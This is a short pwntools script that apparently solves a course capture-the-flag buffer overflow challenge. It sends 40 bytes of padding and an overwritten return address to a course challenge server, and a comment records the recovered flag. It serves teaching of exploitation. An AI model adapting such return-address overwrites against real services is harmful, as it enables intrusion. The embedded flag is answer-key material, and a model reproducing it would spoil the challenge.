# pwntools is a very powerful library for doing exploitation
from pwn import *

# TODO: Update with actual values
HOST = "cs2107-ctfd-i.comp.nus.edu.sg"
PORT = 4006
BINARY = "./bof"

#p = process(BINARY)   # use process instead of remote to execute the local version of the program
p = remote(HOST, PORT)  # to open a connection to the remote service, aka the challenge

# TODO: Fill in your payload
PADDING = b'A'*40
RETURN_ADDRESS = 0x401176
PAYLOAD = PADDING + p64(RETURN_ADDRESS)    # p64 converts an integer to 8-byte little endian bytestring format
p.sendline(PAYLOAD)

# earlier, the script helps us send/receive data to/from the service
# with interactive, we can directly interact with the service
p.interactive()

#gdb bof
#p &win 0x401176
#CS2107{r34dy_2st4r7_my_b1n4ry_j0urn3y}
